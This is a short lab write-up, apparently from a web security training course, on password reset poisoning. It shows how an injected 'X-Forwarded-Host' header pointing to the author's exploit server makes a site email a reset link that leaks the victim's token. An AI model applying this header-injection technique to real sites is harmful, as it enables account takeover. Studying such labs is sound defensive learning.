## Lab 11 - Password reset poisoning via middleware  
**End Goal** - The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. 

---
### Analysis: 
We have:  
Our own Credentials - `wiener:peter`  
Victim Username - `carlos`  

- Clicked Forgot Password, gave the username as `wiener`, and captured the request in burp-suite.  
  
- Using that username it sends a password reset link to my email.  
  
- The Backend Server generates the password reset link dynamically, using the `Host:` header, and generates it like:
    ```
    https://authentic-site.com/forgot-password?token=randomtoken123
    ```  

- I sent that req which is taking the username and sending the mail to the Repeater Tab, and Added `X-Forwarded-Host:` Header with the domain of my exploit server like this:  
    ```
    X-Forwarded-Host: my-exploit-server.net
    ```

- If the server is vulnerable this `X-Forwarded-Host:` Header will override the `Host:` Header and it will generate the link using my `my-exploit-server` that will look like this:  
    ```
    https://my-exploit-server/forgot-password?token=randomtoken123
    ```  
- And the authentic site will send this link to that user's email. If that user clicks this link, because it came from the authentic site, his token will be sent as a Get req to our server because clicking that link made a Get req to our server and because the link contained his password reset token it will also be shown in the logs of the server.